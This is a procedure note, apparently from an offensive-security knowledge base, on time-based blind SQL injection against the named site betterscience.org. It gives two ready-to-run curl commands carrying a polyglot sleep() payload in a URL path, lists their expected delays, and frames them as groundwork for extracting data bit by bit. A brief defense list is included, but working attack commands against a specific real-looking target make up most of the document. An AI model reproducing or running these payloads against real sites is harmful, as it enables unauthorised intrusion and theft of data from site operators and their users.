---
id: proc-4
tags:
  - sqli
  - blind-sqli
  - scalability
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
commands:
  - '[[commands/curl-sqli-payload-sleep-9]]'
  - '[[commands/curl-sqli-payload-sleep-6]]'
verified: false
platforms:
  - Web
  - MySQL
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T03:46:14.900Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Scale Delay with Longer Sleep Times

## Summary

This procedure extends sleep durations in payloads to verify the injection's reliability and potential for binary data exfiltration through repeated timing queries.

## Description

By increasing sleep to 6s and 9s, this tests the payload's scalability, observing proportional delays (6.3s, 9.3s). This confirms the vulnerability for advanced blind SQLi techniques like conditional data extraction bit-by-bit.

## Requirements

1. Prior confirmation of basic injection
2. Ability to measure precise timings

## Defense

Defensive measures and detection strategies:

- Block or sanitize functions like sleep(), benchmark() in inputs
- Deploy intrusion detection for repeated delayed requests
- Enforce strict timeouts on database queries

## Objectives

1. Demonstrate delay proportionality
2. Validate for extended exploitation
3. Assess server tolerance to long queries

## Instructions

### Step 1: Test 9-Second Sleep

**Context**: Inject longer delay to check consistency.

**Command** ([[commands/curl-sqli-payload-sleep-9]]):
```bash
curl -s -w "%{time_total}s" "https://betterscience.org/plugin/tag/if(now()%3dsysdate()%2csleep(9)%2c0)/%2a'XOR(if(now()%3dsysdate()%2csleep(9)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(9)%2c0))OR%22%2f*" -H "Host: betterscience.org" -H "Cookie: [session cookies]" -H "Referer: https://betterscience.org/" -H "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64)..." -H "X-Requested-With: XMLHttpRequest" > /dev/null
```

> Expected: ~9.298s delay.

### Step 2: Test 6-Second Sleep

**Context**: Further verify with intermediate duration.

**Command** ([[commands/curl-sqli-payload-sleep-6]]):
```bash
curl -s -w "%{time_total}s" "https://betterscience.org/plugin/tag/if(now()%3dsysdate()%2csleep(6)%2c0)/%2a'XOR(if(now()%3dsysdate()%2csleep(6)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(6)%2c0))OR%22%2f*" -H "Host: betterscience.org" -H "Cookie: [session cookies]" -H "Referer: https://betterscience.org/" -H "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64)..." -H "X-Requested-With: XMLHttpRequest" > /dev/null
```

> Expected: ~6.272s delay.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]
- [[Collection]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/curl-sqli-payload-sleep-9]]
- [[commands/curl-sqli-payload-sleep-6]]

## Tools Used


## Tags

- [[sqli]]
- [[scalability]]
